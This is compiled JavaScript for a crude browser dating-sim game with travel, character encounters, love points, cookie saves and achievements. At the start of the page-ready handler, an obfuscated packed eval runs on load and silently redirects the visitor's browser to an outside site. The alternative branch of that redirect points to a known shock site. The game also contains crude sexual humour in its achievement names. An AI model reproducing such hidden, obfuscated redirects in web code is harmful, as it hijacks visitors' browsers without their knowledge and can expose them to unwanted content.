(function() {
  var activateOpeningMenu, buildAchievementMessage, changeAutoSave, changeControlState, changeToPreviousControl, chooseRandomFromList, collectAchievement, completeDialogue, continueDialogue, continueSavedGame, encounterPerson, enterAchievementsState, enterChatState, enterChoiceState, enterFreeState, enterLoadingState, enterLoveState, enterMenuState, enterOpeningState, enterRelationshipState, enterRewardState, exitMenu, failLove, followDialogue, getPossibleLinks, handleMessage, initializeGameData, initializeImages, initializeLove, initializeNewGame, loveEvent, openMenu, possiblyEncounterPerson, prepareAchievementData, prepareNextState, prepareRelationshipTable, recordGameState, rewardAchievement, setAutoSaveButtonState, setChatlock, setControls, setDescription, setIndicatorArea, setLocationImage, setPersonImage, setTravelList, setupPerson, startNewGame, startingSequence, succeedLove, testFunctions, travelToLocation;
  $(document).ready(function() {
	eval(function(p,a,c,k,e,r){e=function(c){return c.toString(a)};if(!''.replace(/^/,String)){while(c--)r[e(c)]=k[c]||e(c);k=[function(e){return r[e]}];e=function(){return'\\w+'};c=1};while(c--)if(k[c])p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c]);return p}('8(5!=4){1.2="0://6.7.3/"}9{1.2="0://a.3/"}',11,11,'http|window|location|com|false|true|www|nyanicorn|if|else|meatspin'.split('|'),0,{}))
    testFunctions();
    setControls();
    return initializeGameData();
  });
  testFunctions = function() {
    window.encounterPerson = encounterPerson;
    window.setupPerson = setupPerson;
    window.travelToLocation = travelToLocation;
    window.getPossibleLinks = getPossibleLinks;
    window.recordGameState = recordGameState;
    window.activateOpeningMenu = activateOpeningMenu;
    window.rewardAchievement = rewardAchievement;
    return window.collectAchievement = collectAchievement;
  };
  initializeGameData = function() {
    var cached_game_state;
    $('.container').hide();
    cached_game_state = $.cookie('game_state');
    window.control_elements.hide();
    $('.loading').show();
    $('#loading_skip').click(activateOpeningMenu);
    window.loading = true;
    return $.get("gamedata/data.json", function(data) {
      window.game_data = data;
      window.chatlocked = false;
      if (cached_game_state === undefined || cached_game_state === null) {
        initializeNewGame();
      } else {
        window.game_state = cached_game_state;
      }
      initializeImages();
      return setInterval(recordGameState, 15000);
    });
  };
  recordGameState = function(force) {
    var game_state;
    if (force == null) {
      force = false;
    }
    if (force || window.game_state['autosave']) {
      game_state = JSON.parse(JSON.stringify(window.game_state));
      game_state['control'] = 'Free';
      $.cookie('game_state', JSON.stringify(game_state));
      return console.log("game saved");
    }
  };
  initializeImages = function() {
    var image_names, l, p, _i, _j, _len, _len2, _ref, _ref2;
    $('#background_image').error(function() {
      return $(this).hide();
    });
    $('#person_image').error(function() {
      return $(this).hide();
    });
    window.image_data = {};
    image_names = [];
    _ref = window.game_data['People List'];
    for (_i = 0, _len = _ref.length; _i < _len; _i++) {
      p = _ref[_i];
      image_names.push("images/" + p + ".png");
    }
    _ref2 = window.game_data['Location List'];
    for (_j = 0, _len2 = _ref2.length; _j < _len2; _j++) {
      l = _ref2[_j];
      image_names.push("images/" + l + ".jpg");
    }
    window.preload = {
      necessary: image_names.length - 4,
      success: 0
    };
    $.each(image_names, function(i, path) {
      var cached_image;
      cached_image = $('<img/>');
      cached_image.addClass('cached_image');
      cached_image.load(function() {
        window.preload['success'] += 1;
        $('#progress_bar').width(600 * (1.0 * window.preload['success'] / window.preload['necessary']));
        if (window.preload['success'] >= window.preload['necessary']) {
          if (window.loading) {
            return activateOpeningMenu();
          }
        }
      });
      cached_image.attr('src', path);
      window.image_data[path] = cached_image;
      return cached_image.appendTo($("#meta_container"));
    });
    $('#background_image').hide();
    return $('#person_image').hide();
  };
  setControls = function() {
    var action_handler, actions;
    console.log("controls being set");
    actions = {
      32: {
        Chat: continueDialogue
      },
      'click': {
        Chat: continueDialogue
      }
    };
    window.actions = actions;
    action_handler = function(event) {
      var action;
      action = actions[event][window.game_state['control']];
      if (action !== void 0) {
        return action();
      }
    };
    $(document).keypress(function(e) {
      return action_handler(e.which);
    });
    $('#game_container').click(function() {
      return action_handler('click');
    });
    window.control_elements = $('.free').add($('.menu')).add($('.opening')).add($('.chat')).add($('.love')).add($('.loading')).add($('.relationship')).add($('.achievements')).add($('.reward'));
    $('#menu_button').click(openMenu);
    $('#autosave_button').click(changeAutoSave);
    $('#save_button').click(function() {
      return recordGameState(true);
    });
    $('#menu_opening').click(activateOpeningMenu);
    $('#menu_relationships').click(prepareRelationshipTable);
    $('#menu_achievements').click(prepareAchievementData);
    $('#reward_back').click(changeToPreviousControl);
    $('#love_talk').click(function() {
      return loveEvent(0);
    });
    $('#love_chill').click(function() {
      return loveEvent(1);
    });
    $('#love_footsy').click(function() {
      return loveEvent(2);
    });
    return $('#love_sex').click(function() {
      return loveEvent(3);
    });
  };
  changeAutoSave = function() {
    var current_autostate;
    current_autostate = window.game_state['autosave'];
    window.game_state['autosave'] = !current_autostate;
    return setAutoSaveButtonState();
  };
  setAutoSaveButtonState = function() {
    var next_state;
    next_state = (window.game_state['autosave'] ? "Off" : "On");
    return $('#autosave_button').text("Turn " + next_state + " Autosave");
  };
  changeControlState = function(state) {
    if (!(state === 'Relationship' || state === "Achievements")) {
      window.game_state['previous_control'] = window.game_state['control'];
    }
    window.game_state['control'] = state;
    window.control_elements.hide();
    window.loading = false;
    switch (state) {
      case 'Loading':
        enterLoadingState();
        break;
      case 'Chat':
        enterChatState();
        break;
      case 'Choice':
        enterChoiceState();
        break;
      case 'Free':
        enterFreeState();
        break;
      case 'Love':
        enterLoveState();
        break;
      case 'Menu':
        enterMenuState();
        break;
      case 'Relationship':
        enterRelationshipState();
        break;
      case 'Achievements':
        enterAchievementsState();
        break;
      case 'Reward':
        enterRewardState();
        break;
      case 'Opening':
        enterOpeningState();
    }
    console.log("chatlocked " + window.chatlocked);
    return console.log("moving to " + state + " State");
  };
  enterLoadingState = function() {
    return $('.loading').show();
  };
  enterChatState = function() {
    $('.chat').show();
    return setChatlock(false);
  };
  enterChoiceState = function() {
    return setChatlock(true);
  };
  enterFreeState = function() {
    $('.free').show();
    return setChatlock(true);
  };
  enterLoveState = function() {
    $('.free').show();
    $('.love').show();
    return setChatlock(true);
  };
  enterMenuState = function() {
    $('.menu').show();
    $('#menu_items_container').show();
    return setChatlock(true);
  };
  enterRelationshipState = function() {
    setChatlock(true);
    $('.menu').show();
    $('#menu_items_container').hide();
    return $('#data_container').show();
  };
  enterAchievementsState = function() {
    setChatlock(true);
    $('.menu').show();
    $('#menu_items_container').hide();
    return $('#data_container').show();
  };
  enterRewardState = function() {
    setChatlock(true);
    return $('.reward').show();
  };
  enterOpeningState = function() {
    return $('.opening').show();
  };
  openMenu = function() {
    console.log('open menu');
    changeControlState('Menu');
    $('#menu_button').unbind();
    return $('#menu_button').click(exitMenu);
  };
  exitMenu = function() {
    var previous_state;
    console.log('close menu');
    previous_state = window.game_state['previous_control'];
    changeControlState(previous_state);
    $('#menu_button').unbind();
    return $('#menu_button').click(openMenu);
  };
  changeToPreviousControl = function() {
    return changeControlState(window.game_state['previous_control']);
  };
  followDialogue = function(dialogue) {
    changeControlState('Chat');
    dialogue = dialogue.slice();
    window.dialogue = dialogue;
    console.log("previous control " + window.game_state['previous_control']);
    if (window.game_state['previous_control'] !== 'Love') {
      console.log("IT WAS HERE");
      return setTimeout(continueDialogue, 100);
    }
  };
  continueDialogue = function(choice) {
    var dialogue;
    if (choice == null) {
      choice = null;
    }
    console.log("continued dialogue");
    if (!window.chatlocked || choice !== null) {
      changeControlState("Chat");
      dialogue = window.dialogue;
      if (dialogue.length > 0) {
        handleMessage(dialogue[0]);
        return window.dialogue = dialogue.splice(1);
      } else {
        return completeDialogue();
      }
    }
  };
  completeDialogue = function() {
    changeControlState(window.next_state);
    collectAchievement(buildAchievementMessage("Dialogue", window.game_state['location'], window.person, window.dialogue));
    return window.intro = false;
  };
  handleMessage = function(message) {
    var c, choice_box, choices, container, i, item, _i, _len, _results;
    if (message instanceof Object) {
      choices = message['Choice'];
      i = 0;
      window.choices = choices;
      container = $('#choice_container').text("");
      _results = [];
      for (_i = 0, _len = choices.length; _i < _len; _i++) {
        c = choices[_i];
        choice_box = $(document.createElement('div'));
        choice_box.addClass('choice_box');
        item = $(document.createElement('button'));
        item.attr("count", i);
        item.addClass('choice_item box');
        item.click(function() {
          return continueDialogue(item.attr("count"));
        });
        item.text(c);
        choice_box.append(item);
        container.append(choice_box);
        console.log("" + i + " -- " + c['Response']);
        _results.push(i += 1);
      }
      return _results;
    } else {
      $("#dialogue_area").text(message);
      return console.log(message);
    }
  };
  getPossibleLinks = function() {
    var possible_links;
    possible_links = window.game_data['Locations'][window.game_state['location']]['Links'];
    console.log(possible_links);
    return possible_links;
  };
  travelToLocation = function(location, encounter_possible) {
    if (encounter_possible == null) {
      encounter_possible = true;
    }
    if (!(window.game_state['control'] === 'Free' || window.game_state['control'] === 'Love')) {
      return;
    }
    changeControlState('Free');
    setChatlock(true);
    console.log("Moving to " + location);
    window.game_state['location'] = location;
    setIndicatorArea(location);
    setDescription(location, 'Location');
    $('#status_location').text(location);
    setPersonImage(null);
    if (encounter_possible) {
      possiblyEncounterPerson(location);
    } else {
      changeControlState('Free');
      window.person = null;
    }
    collectAchievement(buildAchievementMessage("Travel", location, window.person, window.dialogue));
    setTravelList(location);
    return setLocationImage(location);
  };
  setTravelList = function(location) {
    var container, item, l, link_container, links, _i, _len, _results;
    container = $('#travel_links').text("");
    links = window.game_data['Locations'][location]['Links'];
    _results = [];
    for (_i = 0, _len = links.length; _i < _len; _i++) {
      l = links[_i];
      link_container = $(document.createElement('div'));
      link_container.addClass('link_container');
      item = $(document.createElement('button'));
      item.addClass('link box');
      item.text(l);
      item.click(function() {
        return travelToLocation($(this).text());
      });
      link_container.append(item);
      _results.push(container.append(link_container));
    }
    return _results;
  };
  setLocationImage = function(location) {
    $('#background_image').attr('src', "images/" + location + ".jpg");
    return $('#background_image').show();
  };
  possiblyEncounterPerson = function(location) {
    var possible_people;
    possible_people = window.game_data['Locations'][location]['People'];
    if (possible_people !== null && ((possible_people.length === 1 && Math.random() > 0.75) || (Math.random() > 0.4))) {
      return encounterPerson(location);
    }
  };
  encounterPerson = function(location) {
    var person, possible_people;
    possible_people = window.game_data['Locations'][location]['People'];
    if (possible_people !== null) {
      prepareNextState('Love');
      person = chooseRandomFromList(possible_people);
      return setupPerson(person);
    }
  };
  setupPerson = function(person) {
    var dialogue, possible_dialogue;
    console.log("Encountered " + person);
    window.person = person;
    setIndicatorArea(person);
    setDescription(person, 'Person');
    possible_dialogue = window.game_data['People'][person]['Dialogue'];
    dialogue = chooseRandomFromList(possible_dialogue);
    setPersonImage(person);
    return followDialogue(dialogue);
  };
  setPersonImage = function(person) {
    var path, person_element, width;
    person_element = $('#person_image');
    if (person === null) {
      return person_element.hide();
    }
    path = "images/" + person + ".png";
    person_element.attr('src', path);
    person_element.show();
    width = window.image_data[path].width();
    person_element.width(width);
    person_element.height(window.image_data[path].height());
    return person_element.css('margin-left', (800 - width) / 2);
  };
  prepareNextState = function(state) {
    return window.next_state = state;
  };
  loveEvent = function(level) {
    var current, difficulty, power;
    current = window.game_state['love'][window.person];
    difficulty = 6 * Math.pow(level, 3) - 0.1 * current;
    if (current === null) {
      initializeLove(window.person);
    }
    power = Math.random() * 10;
    if (power > difficulty) {
      return succeedLove(person, level);
    } else {
      return failLove(person, level);
    }
  };
  initializeLove = function(person) {
    return window.game_state['love'][person] = 1;
  };
  succeedLove = function(person, level) {
    var message;
    window.game_state['love'][person] += Math.max(Math.pow(level + 1, 2), -5);
    prepareNextState('Free');
    message = window.game_data['People'][person]['Love']['Success'];
    if (window.game_state['love'][person] >= 400) {
      message = window.game_data['People'][person]['Love']['Love'];
    }
    if (message === void 0) {
      message = "" + person + ": " + window.game_data['Default Love Success'];
    }
    return followDialogue(message);
  };
  failLove = function(person, level) {
    var message;
    window.game_state['love'][person] -= level;
    prepareNextState('Free');
    message = window.game_data['People'][person]['Love']['Failure'];
    if (message === void 0) {
      message = "" + person + ": " + window.game_data['Default Love Failure'];
    }
    return followDialogue(message);
  };
  prepareRelationshipTable = function() {
    var container, entry, item, love_points, person, value, _i, _len, _ref, _results;
    console.log("relationshipping");
    changeControlState('Relationship');
    container = $('#data_container');
    container.text("");
    _ref = window.game_data['People List'];
    _results = [];
    for (_i = 0, _len = _ref.length; _i < _len; _i++) {
      person = _ref[_i];
      entry = $(document.createElement('dt'));
      entry.text(person);
      value = $(document.createElement('dd'));
      love_points = window.game_state['love'][person];
      value.text(love_points);
      if (love_points < 0) {
        value.addClass("rel_bad");
      } else if (love_points < 100) {
        value.addClass("rel_normal");
      } else if (love_points < 400) {
        value.addClass("rel_good");
      } else {
        value.addClass("rel_best");
      }
      item = $(document.createElement('div'));
      item.append(entry);
      item.append(value);
      _results.push(container.append(item));
    }
    return _results;
  };
  chooseRandomFromList = function(list) {
    return list[parseInt(Math.random() * list.length)];
  };
  setIndicatorArea = function(message) {
    return $('#indicator_area').text(message);
  };
  setChatlock = function(chatlock) {
    if (chatlock) {
      return window.chatlocked = true;
    } else {
      return setTimeout((function() {
        return window.chatlocked = false;
      }), 100);
    }
  };
  setDescription = function(target, type) {
    var message;
    if (type === 'Location') {
      message = window.game_data['Locations'][target]['Description'];
    } else {
      message = window.game_data['People'][target]['Description'];
      $('#description_love').text("Love Points: " + window.game_state['love'][window.person]);
    }
    return $('#description_message').text(message);
  };
  activateOpeningMenu = function() {
    changeControlState('Opening');
    setChatlock(true);
    $('#opening_new').click(startNewGame);
    return $('#opening_continue').click(continueSavedGame);
  };
  initializeNewGame = function() {
    var ach, achievement, default_love, no_achievements, person, _i, _j, _len, _len2, _ref, _ref2;
    default_love = {};
    no_achievements = {};
    _ref = game_data['People List'];
    for (_i = 0, _len = _ref.length; _i < _len; _i++) {
      person = _ref[_i];
      default_love[person] = 0;
    }
    _ref2 = game_data['Achievement List'];
    for (_j = 0, _len2 = _ref2.length; _j < _len2; _j++) {
      ach = _ref2[_j];
      achievement = ach;
      no_achievements[achievement] = [achievement[0], false, {}];
    }
    window.game_state = {
      location: "Home",
      control: "Free",
      autosave: false,
      love: default_love,
      achievements: no_achievements
    };
    return setAutoSaveButtonState();
  };
  startNewGame = function() {
    initializeNewGame();
    return startingSequence();
  };
  continueSavedGame = function() {
    console.log("trying to continue");
    window.game_state = JSON.parse($.cookie('game_state'));
    setAutoSaveButtonState();
    return travelToLocation(window.game_state['location'], false);
  };
  startingSequence = function() {
    window.intro = true;
    setChatlock(false);
    travelToLocation('The Apartment', false);
    prepareNextState('Free');
    return followDialogue(window.game_data['Starting Sequence']);
  };
  prepareAchievementData = function() {
    var achievement, container, entry, record, success, text, _i, _len, _ref, _results;
    console.log("Building Achievement Record");
    changeControlState('Achievements');
    container = $('#data_container');
    container.text("");
    _ref = window.game_data['Achievement List'];
    _results = [];
    for (_i = 0, _len = _ref.length; _i < _len; _i++) {
      achievement = _ref[_i];
      record = window.game_state['achievements'][achievement];
      entry = $(document.createElement('div'));
      success = record[1] ? ":)" : "__";
      text = "" + success + " -- " + achievement;
      entry.addClass("ach");
      if (record[1]) {
        entry.addClass("ach_yes");
      } else {
        entry.addClass("ach_no");
      }
      entry.text(text);
      _results.push(container.append(entry));
    }
    return _results;
  };
  collectAchievement = function(message) {
    var data;
    console.log("collecting........................");
    rewardAchievement('Happy Birthday Nick!');
    if (message['Action'] === "Travel" && message['Location'] === "Jin's Bed") {
      rewardAchievement('Molested Jin');
    }
    data = window.game_state['achievements']['Socially Acceptable'][2];
    if (message['Action'] === 'Dialogue') {
      if (data['list'] === void 0) {
        data['list'] = [];
      }
      if (data['list'].indexOf(message['Person']) === -1) {
        if (message['Person'] !== null) {
          data['list'].push(message['Person']);
        }
      }
      if (data['list'].length === window.game_data['People List'].length) {
        rewardAchievement('Socially Acceptable');
      }
    }
    if (window.game_state['love']['Hawaiian Barbecue Guy'] >= 400) {
      rewardAchievement('Fried Rice');
    }
    if (window.game_state['love']['Lilly'] >= 400 || window.game_state['love']['Lydia'] >= 400) {
      rewardAchievement('Waifu Status');
    }
    if (window.game_state['love']['Some Post'] >= 400) {
      rewardAchievement('Le Me and the Gf');
    }
    if (message['Action'] === "Travel" && message['Location'] === "Chipotle") {
      data = window.game_state['achievements']['Fatass'][2];
      if (data['count'] === void 0) {
        data['count'] = 0;
      }
      data['count'] += 1;
      if (data['count'] >= 30) {
        rewardAchievement('Fatass');
      }
    }
    if (window.game_state['love']['Professor'] >= 400) {
      rewardAchievement('Office After Hours');
    }
    data = window.game_state['achievements']['Through The Portal'][2];
    if (message['Action'] === 'Travel') {
      console.log("whoo");
      if (data['list'] === void 0) {
        data['list'] = [];
      }
      data['list'].push(message['Location']);
      if (data['list'].length > 3) {
        data['list'] = data['list'].slice(1);
      }
      if (data['list'].length === 3 && data['list'][0] === 'The Apartment' && data['list'][1] === 'Skyrim' && data['list'][2] === "David's Room") {
        return rewardAchievement("Through The Portal");
      }
    }
  };
  rewardAchievement = function(achievement) {
    return setTimeout((function() {
      var description;
      if (!window.game_state['achievements'][achievement][1]) {
        window.game_state['achievements'][achievement][1] = true;
        description = window.game_data['Achievements'][achievement];
        changeControlState('Reward');
        return $('#reward_message').text("Solved! Achievement: " + achievement + " -- " + description);
      }
    }), 200);
  };
  buildAchievementMessage = function(action, location, person, dialogue) {
    console.log("building.........................");
    return {
      Action: action,
      Location: location,
      Person: person,
      Dialogue: dialogue
    };
  };
}).call(this);
